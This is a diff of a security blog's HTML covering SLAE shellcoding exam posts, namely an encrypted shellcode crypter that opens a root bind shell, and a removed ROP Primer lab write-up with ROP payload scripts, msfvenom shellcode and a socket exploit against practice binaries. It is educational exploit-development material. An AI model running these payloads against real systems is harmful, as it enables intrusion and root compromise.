+</span><span class='line'><span class="se">\x</span>cb<span class="se">\x</span>1a<span class="se">\x</span>5c<span class="se">\x</span>61<span class="se">\x</span>70<span class="se">\x</span>5e<span class="se">\x</span>82<span class="se">\x</span>09<span class="se">\x</span>59<span class="se">\x</span>4f<span class="se">\x</span>e6<span class="se">\x</span>42<span class="se">\x</span>1a<span class="se">\x</span>62<span class="se">\x</span>b9<span class="se">\x</span>a6<span class="se">\x</span>43<span class="se">\x</span>09<span class="se">\x</span>df<span class="se">\x</span>99<span class="se">\x</span>33<span class="se">\x</span>22<span class="se">\x</span>f4<span class="se">\x</span>fa<span class="se">\x</span>41<span class="se">\x</span>a5<span class="se">\x</span>27<span class="se">\x</span>6a<span class="se">\x</span>e7<span class="se">\x</span>fc<span class="se">\x</span>76<span class="se">\x</span>6a<span class="se">\x</span>86<span class="se">\x</span>5e<span class="se">\x</span>a2<span class="se">\x</span>8b<span class="se">\x</span>f3<span class="se">\x</span>3f<span class="se">\x</span>5c<span class="se">\x</span>90<span class="se">\x</span>e9<span class="se">\x</span>eb<span class="se">\x</span>38<span class="se">\x</span>4a<span class="se">\x</span>0f<span class="se">\x</span>30<span class="se">\x</span>db<span class="se">\x</span>20<span class="se">\x</span>4a<span class="se">\x</span>8f<span class="se">\x</span>cd<span class="se">\x</span>8a<span class="se">\x</span>a2<span class="se">\x</span>53<span class="se">\x</span>af<span class="se">\x</span>c4<span class="se">\x</span>03<span class="se">\x</span>1b<span class="se">\x</span>e8<span class="se">\x</span>f5<span class="se">\x</span>9e<span class="se">\x</span>e4<span class="se">\x</span>ed<span class="se">\x</span>a6<span class="se">\x</span>43<span class="se">\x</span>c5<span class="se">\x</span>92<span class="se">\x</span>dd<span class="se">\x</span>b9<span class="se">\x</span>20<span class="se">\x</span>0d<span class="se">\x</span>1a<span class="se">\x</span>b0<span class="se">\x</span>95<span class="se">\x</span>e7<span class="se">\x</span>33<span class="se">\x</span>d0<span class="se">\x</span>44<span class="se">\x</span>1b<span class="se">\x</span>05<span class="se">\x</span>47<span class="se">\x</span>1c<span class="se">\x</span>59<span class="se">\x</span>3f<span class="se">\x</span>99<span class="se">\x</span>e1<span class="se">\x</span>d2<span class="se">\x</span>74<span class="se">\x</span>62<span class="se">\x</span>6d<span class="se">\x</span>2b<span class="se">\x</span>85<span class="se">\x</span>55<span class="se">\x</span>e2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <strong>decrypter</strong> target already takes care of executing the crypter with the specified shellcode and extracting it from the above output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make decrypter
+</span><span class='line'>cc -W -Wall -Wformat<span class="o">=</span><span class="m">2</span> -fno-stack-protector -zexecstack -ggdb -DSHELLCODE<span class="o">=</span><span class="sb">`</span>./crypter<span class="p">|</span>tail -n1<span class="sb">`</span>  -c -o decrypter.o decrypter.c
+</span><span class='line'>cc -lcrypto -lcurl -zexecstack  decrypter.o common.o   -o decrypter
+</span><span class='line'><span class="c"># ./decrypter</span>
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'><span class="nv">$ </span>ss -nlt<span class="p">|</span>grep 4242
+</span><span class='line'>LISTEN     <span class="m">0</span>      <span class="m">0</span>                                                         *:4242                                                                  *:*
+</span><span class='line'><span class="nv">$ </span>nc 127.0.0.1 4242
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Printing the contents of the decrypted buffer shows that the shellcode payload was correctly decrypted and is not gibberish unlike the original provided one:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b 36
+</span><span class='line'>Breakpoint <span class="m">1</span> at 0xb22: file decrypter.c, line 36.
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r
+</span><span class='line'>Starting program: /attic/slae/exam/0x07-crypter/decrypter
+</span><span class='line'><span class="o">[</span>Thread debugging using libthread_db enabled<span class="o">]</span>
+</span><span class='line'>Using host libthread_db library <span class="s2">&quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;</span>.
+</span><span class='line'><span class="o">[</span>New Thread 0xb7a9bb40 <span class="o">(</span>LWP 1008<span class="o">)]</span>
+</span><span class='line'><span class="o">[</span>Thread 0xb7a9bb40 <span class="o">(</span>LWP 1008<span class="o">)</span> exited<span class="o">]</span>
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'>
+</span><span class='line'>Thread <span class="m">1</span> <span class="s2">&quot;decrypter&quot;</span> hit Breakpoint 1, main <span class="o">()</span> at decrypter.c:36
+</span><span class='line'><span class="m">36</span>              <span class="o">(</span>*<span class="o">(</span>void<span class="o">(</span>*<span class="o">)(</span>void<span class="o">))</span> b<span class="o">)()</span><span class="p">;</span>         /* Execute decrypted shellcode. */
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i b
+</span><span class='line'>   0xbfffd648:  xor    eax,eax
+</span><span class='line'>   0xbfffd64a:  xor    esi,esi
+</span><span class='line'>   0xbfffd64c:  cdq
+</span><span class='line'>   0xbfffd64d:  mov    ax,0x167
+</span><span class='line'>   0xbfffd651:  push   0x2
+</span><span class='line'>   0xbfffd653:  pop    ebx
+</span><span class='line'>   0xbfffd654:  push   0x1
+</span><span class='line'>   0xbfffd656:  pop    ecx
+</span><span class='line'>   0xbfffd657:  int    0x80
+</span><span class='line'>   0xbfffd659:  xchg   ebx,eax
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i ptr
+</span><span class='line'>   0x40308c &lt;shellcode+12&gt;:     sti
+</span><span class='line'>   0x40308d &lt;shellcode+13&gt;:     outs   dx,BYTE PTR ds:<span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>   0x40308e &lt;shellcode+14&gt;:     sar    dh,0xcc
+</span><span class='line'>   0x403091 &lt;shellcode+17&gt;:     and    cl,BYTE PTR <span class="o">[</span>edi+eiz*8+0x36aa830f<span class="o">]</span>
+</span><span class='line'>   0x403098 &lt;shellcode+24&gt;:     outs   dx,BYTE PTR ds:<span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>   0x403099 &lt;shellcode+25&gt;:     fmul   QWORD PTR <span class="o">[</span>edx-0x6c<span class="o">]</span>
+</span><span class='line'>   0x40309c &lt;shellcode+28&gt;:     cmp    al,0xb5
+</span><span class='line'>   0x40309e &lt;shellcode+30&gt;:     xchg   BYTE PTR <span class="o">[</span>eax-0x58bfcbc1<span class="o">]</span>,dh
+</span><span class='line'>   0x4030a4 &lt;shellcode+36&gt;:     or     ah,dl
+</span><span class='line'>   0x4030a6 &lt;shellcode+38&gt;:     sub    ecx,esi
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
       <h1 class="entry-title"><a href="/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/">SLAE 0x06: Polymorphic Shellcodes</a></h1>
     
     
@@ -611,7 +1091,7 @@ Student-ID: SLAE-1154
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>To save space, pointer arithmeric operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
+<p>To save space, pointer arithmetic operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2124,7 +2604,7 @@ Student-ID: SLAE-1154
 
 <h3>2. linux/x86/shell_find_tag</h3>
 
-<p>This one is similar to the above, but instead of expecting a specific remote port on one of its file descriptors, it searches for a configure tag:</p>
+<p>This one is similar to the above, but instead of expecting a specific remote port on one of its file descriptors, it searches for a configured tag:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2595,7 +3075,7 @@ Student-ID: SLAE-1154
 
 <h3>3. linux/x86/read_file</h3>
 
-<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having 0x00 characters in the resulting shellcode:</p>
+<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having \x00 characters in the resulting shellcode:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6317,561 +6797,9 @@ and updates EIP to that address (the system(3) function).</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/11/12/rop-primer-0-dot-2/">ROP Primer: 0.2</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-11-12T01:31:07+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:31 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h2>level0</h2>
-
-<p>Started, as usual, by fetching the number of characters needed to overflow the
-name. The regular MSF pattern-create (or its alternatives like peda) approach
-can be used. In this case consider that 44 bytes are needed to overflow.</p>
-
-<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
-most likely. One can use the mprotect(2) system call to bypass the NX protection
-(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
-pages as executable and read a shellcode into that location from standard input.</p>
-
-<p>The Python code below was used to create two additional (fake) stack frames:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
-</span><span class='line'>
-</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">mprotectaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080523e0</span><span class="p">)</span>
-</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048882</span><span class="p">)</span>
-</span><span class='line'><span class="n">mprotectarg1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffdf000</span><span class="p">)</span> <span class="c"># Stack address.</span>
-</span><span class='line'><span class="n">mprotectlen</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>       <span class="c"># Address length.</span>
-</span><span class='line'><span class="n">mprotectflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>        <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080517f0</span><span class="p">)</span>
-</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># Read from standard input.</span>
-</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">mprotectarg1</span>
-</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">mprotectlen</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">mprotectaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">mprotectarg1</span> <span class="o">+</span> <span class="n">mprotectlen</span> <span class="o">+</span> <span class="n">mprotectflgs</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readbuf</span>                    <span class="c"># Jump to the marked stack area.</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The (not encoded) shellcode was generated using msfvenom:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py <span class="nv">CMD</span><span class="o">=</span>/bin/sh 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>    <span class="se">\</span>
-</span><span class='line'><span class="go">    tail -n+6|                                          \</span>
-</span><span class='line'><span class="go">    sed -e &#39;s,buf += &quot;,,&#39; -e &#39;s,&quot;,,g&#39;|                  \</span>
-</span><span class='line'><span class="go">    tr -d &#39;\n&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And, finally, executed with:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level0@rop:~$</span> <span class="o">(</span>python boom.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>/home/level0/level0
-</span><span class='line'><span class="go">[+] ROP tutorial level0</span>
-</span><span class='line'><span class="go">[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!</span>
-</span><span class='line'><span class="go">cat flag</span>
-</span><span class='line'><span class="go">flag{rop_the_night_away}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>level1</h2>
-
-<p>This first needs some code analysis to figure out where exactly the overflow
-occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
-control) is also being used when reading its (path) name from the socket:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">read_bytes</span><span class="p">,</span> <span class="n">filesize</span><span class="p">;</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">str_filesize</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">[...]</span>
-</span><span class='line'>
-</span><span class='line'><span class="cm">/* Read the file size from the socket. */</span>
-</span><span class='line'><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">str_filesize</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
-</span><span class='line'><span class="n">filesize</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">str_filesize</span><span class="p">);</span>
-</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">filebuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;---------------------+</span>
-</span><span class='line'>                                                        <span class="o">|</span>
-</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, send your file:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>          <span class="o">|</span>
-</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
-</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
-</span><span class='line'><span class="cm">/* Read the file of size filesize. */</span>                   <span class="o">|</span>
-</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filebuf</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;-------------+</span>
-</span><span class='line'>                                                        <span class="o">|</span>
-</span><span class='line'><span class="p">[...]</span>                                                   <span class="o">|</span>
-</span><span class='line'>                                                        <span class="o">|</span>
-</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, give a filename:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>           <span class="o">|</span> <span class="n">not</span>
-</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
-</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
-</span><span class='line'><span class="cm">/* Read the file name from the socket. */</span>               <span class="o">|</span>
-</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>                  <span class="o">|</span>
-</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;------------+</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
-fixed at 32 bytes of size). The read(2) call should have been:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="n">filename</span><span class="p">[</span><span class="n">read_bytes</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Keep in mind the file descriptor count of the child process:</p>
-
-<pre><code> parent
-+------+
-| 0    | =&gt; stdin
-| 1    | =&gt; stdout
-| 2    | =&gt; stderr
-| 3    | =&gt; listenfd
-| 4    | =&gt; connfd (closed in the while loop before the accept call)
-+------+
-
- child
-+------+
-| 0    | =&gt; stdin
-| 1    | =&gt; stdout
-| 2    | =&gt; stderr
-| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
-| 4    | =&gt; connfd
-+------+
-</code></pre>
-
-<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
-binary in the PLT section were retrieved:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -D level1|grep -E &quot;(open|read|write)@plt&gt;:&quot;</span>
-</span><span class='line'><span class="mh">08048640</span> <span class="p">&lt;</span><span class="nf">read@plt</span><span class="p">&gt;:</span>
-</span><span class='line'><span class="mh">080486d0</span> <span class="p">&lt;</span><span class="nf">open@plt</span><span class="p">&gt;:</span>
-</span><span class='line'><span class="mh">08048700</span> <span class="p">&lt;</span><span class="nf">write@plt</span><span class="p">&gt;:</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Followed by the address of an unused and writable section in the ELF file that
-<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
-file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> readelf -S level1<span class="p">|</span>grep WA
-</span><span class='line'><span class="go">[19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4</span>
-</span><span class='line'><span class="go">[20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4</span>
-</span><span class='line'><span class="go">[21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4</span>
-</span><span class='line'><span class="go">[22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4</span>
-</span><span class='line'><span class="go">[23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4</span>
-</span><span class='line'><span class="go">[24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4</span>
-</span><span class='line'><span class="go">[25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4</span>
-</span><span class='line'><span class="go">[26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>0xf0 bytes is more than enough to hold the 53 bytes of the file. Since the
-binary also has the flag character array (NUL terminated), its address can be
-used, instead:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x"># if (strstr(filename, &quot;flag&quot;)) &lt;== This one here.</span>
-</span><span class='line'><span class="x">$ objdump -s -j .rodata level1|grep flag</span>
-</span><span class='line'><span class="x">8049128 666c6167 00000000 20205845 52584553  flag....  XERXES</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>As for the exploit:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
-</span><span class='line'>
-</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">64</span>
-</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef7</span><span class="p">)</span>
-</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef6</span><span class="p">)</span>
-</span><span class='line'>
